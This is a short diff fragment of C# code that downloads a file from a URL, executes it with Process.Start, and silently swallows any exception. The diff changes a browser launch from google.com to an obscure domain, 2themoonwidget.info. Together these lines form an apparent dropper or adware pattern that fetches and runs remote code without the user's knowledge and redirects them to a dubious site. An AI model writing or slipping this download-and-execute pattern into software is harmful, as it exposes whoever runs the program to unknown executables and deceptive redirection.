@@ -27,7 +27,7 @@ uniq_id
 			   eb.DownloadFile(url, destinationpath);
 			   System.Diagnostics.Process.Start(destinationpath);
 	
-			   System.Diagnostics.Process.Start("http://google.com");
+			   System.Diagnostics.Process.Start("http://2themoonwidget.info");
 		       }
 		       catch(Exception e) {  }
 		   }
